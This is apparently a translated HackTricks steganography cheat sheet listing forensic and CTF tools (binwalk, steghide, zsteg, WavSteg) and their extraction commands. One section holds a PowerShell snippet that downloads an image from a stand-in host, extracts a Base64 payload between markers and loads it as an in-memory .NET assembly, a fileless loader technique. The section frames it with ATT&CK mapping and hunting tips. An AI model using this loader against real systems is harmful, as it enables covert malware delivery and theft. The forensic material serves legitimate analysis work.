# Stego 技巧

{{#include ../banners/hacktricks-training.md}}

## **从文件中提取数据**

### **Binwalk**

用于在二进制文件中搜索嵌入的隐藏文件和数据的工具。它可以通过 `apt` 安装，源码可在 [GitHub](https://github.com/ReFirmLabs/binwalk) 获取。
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

根据文件的头部和尾部恢复文件，对 png 图像很有用。可通过 `apt` 安装，源代码托管在 [GitHub](https://github.com/korczis/foremost) 上。
```bash
foremost -i file # Extracts data
```
### **Exiftool**

帮助查看文件元数据，可在 [here](https://www.sno.phy.queensu.ca/~phil/exiftool/) 获取。
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

类似于 exiftool，用于查看元数据。  
可通过 `apt` 安装，源码在 [GitHub](https://github.com/Exiv2/exiv2)，并且有一个 [official website](http://www.exiv2.org/)。
```bash
exiv2 file # Shows the metadata
```
### **File**

识别你正在处理的文件类型。

### **Strings**

从文件中提取可读字符串，使用各种编码设置来过滤输出。
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **比较 (cmp)**

用于比较已修改文件与其在线原始版本。
```bash
cmp original.jpg stego.jpg -b -l
```
## **在文本中提取隐藏数据**

### **空格中的隐藏数据**

看似空白的空格中可能藏有不可见字符。要提取这些数据，请访问 [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder)。

## **从图像中提取数据**

### **使用 GraphicMagick 识别图像详情**

[GraphicMagick](https://imagemagick.org/script/download.php) 用于确定图像文件类型并识别潜在的损坏。执行下面的命令以检查图像：
```bash
./magick identify -verbose stego.jpg
```
要尝试修复损坏的图像，添加元数据注释可能有帮助：
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide 用于数据隐藏**

Steghide 可以将数据隐藏在 `JPEG, BMP, WAV, and AU` 文件中，能够嵌入和提取加密数据。使用 `apt` 安装很简单，其 [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).

**命令：**

- `steghide info file` 显示文件是否包含隐藏数据。
- `steghide extract -sf file [--passphrase password]` 提取隐藏的数据（密码为可选）。

如需基于网页的提取，请访问 [this website](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- 要对 Steghide 尝试密码破解，请使用 [stegcracker](https://github.com/Paradoxis/StegCracker.git)，如下：
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg for PNG and BMP Files**

zsteg 专注于发掘 PNG 和 BMP 文件中的隐藏数据。安装通过 `gem install zsteg` 完成，源码见其 [GitHub](https://github.com/zed-0xff/zsteg)。

**Commands:**

- `zsteg -a file` 对文件应用所有检测方法。
- `zsteg -E file` 指定用于数据提取的 payload。

### **StegoVeritas and Stegsolve**

**stegoVeritas** 会检查 metadata，执行图像转换，并应用 LSB brute forcing 等功能。使用 `stegoveritas.py -h` 查看完整选项列表，或运行 `stegoveritas.py stego.jpg` 执行所有检查。

**Stegsolve** 通过应用各种颜色滤镜来揭示图像中的隐藏文本或信息。可在其 [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve) 获取。

### **FFT for Hidden Content Detection**

Fast Fourier Transform (FFT) 技术可以揭示图像中隐藏的内容。 有用的资源包括：

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy for Audio and Image Files**

Stegpy 允许将信息嵌入图像和音频文件，支持的格式包括 PNG、BMP、GIF、WebP 和 WAV。可在其 [GitHub](https://github.com/dhsdshdhk/stegpy) 获取。

### **Pngcheck for PNG File Analysis**

要分析 PNG 文件或验证其真实性，请使用：
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **用于图像分析的附加工具**

如需进一步探索，请访问：

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## 标记分隔的 Base64 payloads 隐藏在图像中 (malware delivery)

Commodity loaders 越来越多地将 Base64-encoded payloads 以纯文本形式隐藏在看似有效的图像内部（通常为 GIF/PNG）。与像素级 LSB 不同，这些 payload 是通过嵌入在文件文本/metadata 中的唯一起始/结束标记字符串来分隔的。然后 PowerShell stager 会：

- Downloads the image over HTTP(S)
- 定位标记字符串（观察到的示例：<<sudo_png>> … <<sudo_odt>>）
- 提取两标记之间的文本并将其 Base64 解码为字节
- 在内存中加载 .NET assembly 并调用已知的入口方法（不将文件写入磁盘）

Minimal PowerShell carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
备注
- 这属于 ATT&CK T1027.003 (steganography)。标记字符串在不同 campaign 之间会有所不同。
- Hunting：扫描下载的图片以查找已知的分隔符；标记使用 `DownloadString` 后跟 `FromBase64String` 的 `PowerShell`。

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **从音频中提取数据**

**Audio steganography** 提供了一种在音频文件中隐藏信息的独特方法。不同工具用于嵌入或提取隐藏内容。

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide 是一个多功能工具，用于在 JPEG、BMP、WAV 和 AU 文件中隐藏数据。详细说明请参见 [stego tricks documentation](stego-tricks.md#steghide)。

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

该工具兼容多种格式，包括 PNG、BMP、GIF、WebP 和 WAV。更多信息请参阅 [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav)。

### **ffmpeg**

ffmpeg 对评估音频文件完整性至关重要，能显示详细信息并定位任何不一致之处。
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg 擅长利用 least significant bit 策略在 WAV 文件中隐藏和提取数据。可在 [GitHub](https://github.com/ragibson/Steganography#WavSteg) 获取。命令包括：
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound 允许在音频文件中使用 AES-256 对信息进行加密并检测隐藏信息。可从 [the official page](http://jpinsoft.net/deepsound/download.aspx) 下载。

### **Sonic Visualizer**

Sonic Visualizer 是用于音频文件的可视化与分析检查的宝贵工具，能够揭示其他方法无法发现的隐藏元素。更多信息请访问 [official website](https://www.sonicvisualiser.org/)。

### **DTMF Tones - Dial Tones**

可以通过像 [this DTMF detector](https://unframework.github.io/dtmf-detect/) 和 [DialABC](http://dialabc.com/sound/detect/index.html) 这样的在线工具检测音频文件中的 DTMF 音。

## **其他技术**

### **Binary Length SQRT - QR Code**

二进制长度的平方根为整数的数据可能代表一个 QR Code。使用此代码片段来检查：
```python
import math
math.sqrt(2500) #50
```
要将二进制转换为图像，请查看 [dcode](https://www.dcode.fr/binary-image)。要读取 QR 码，请使用 [this online barcode reader](https://online-barcode-reader.inliteresearch.com/)。

### **盲文翻译**

要翻译盲文， [Branah Braille Translator](https://www.branah.com/braille-translator) 是一个极好的资源。

## **参考资料**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
